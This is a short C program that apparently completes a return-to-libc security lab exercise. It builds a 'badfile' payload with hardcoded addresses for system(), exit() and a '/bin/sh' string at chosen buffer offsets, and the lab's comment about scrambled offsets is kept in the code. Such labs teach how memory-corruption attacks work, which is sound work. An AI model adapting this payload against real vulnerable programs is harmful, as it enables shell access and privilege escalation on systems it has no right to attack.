#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(int argc, char ** argv)
{
   char buf[76];
   FILE *badfile;

   badfile = fopen("badfile", "w");

   /* You need to decide the address and the values for X, Y, Z. The
 *       order of the three statements does not imply the order of X, Y, Z.
 *             Actually, we intentionally scrambled the order. */ 
   buf[0] = 'a';
   *(long *) &buf[60] = 0xbffffeab; //"/bin/sh"
   *(long *) &buf[52] = 0xb7ea88b0; // system()
   *(long *) &buf[56] = 0xb7e9db30; // exit()

   fwrite(buf, sizeof(buf), 1, badfile);
   fclose(badfile);
}
